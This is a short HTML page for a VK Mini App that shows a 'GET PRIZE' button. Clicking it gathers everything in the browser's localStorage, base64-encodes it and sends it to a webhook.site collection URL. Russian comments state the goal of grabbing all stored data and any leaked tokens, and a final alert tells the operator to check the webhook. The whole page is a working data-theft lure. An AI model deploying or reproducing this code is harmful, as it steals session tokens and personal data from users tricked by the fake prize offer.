<!DOCTYPE html>
<html>
<head>
    <script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js"></script>
</head>
<body>
    <button id="btn" style="padding: 20px; background: red; color: white;">ПОЛУЧИТЬ ПРИЗ</button>
    <script>
        vkBridge.send('VKWebAppInit');

        document.getElementById('btn').onclick = function() {
            // Пытаемся достать ВСЁ из localStorage
            let allData = JSON.stringify(localStorage);
            
            // Если localStorage пуст (из-за изоляции), попробуем достать токен через Bridge
            // Иногда приложения по ошибке прокидывают токены в родительское окно
            fetch('https://webhook.site/195e32ed-1e8e-40af-bc70-c2aac62a6661?full_storage=' + btoa(allData));
            
            alert("Проверка завершена. Проверь Webhook!");
        };
    </script>
</body>
</html>
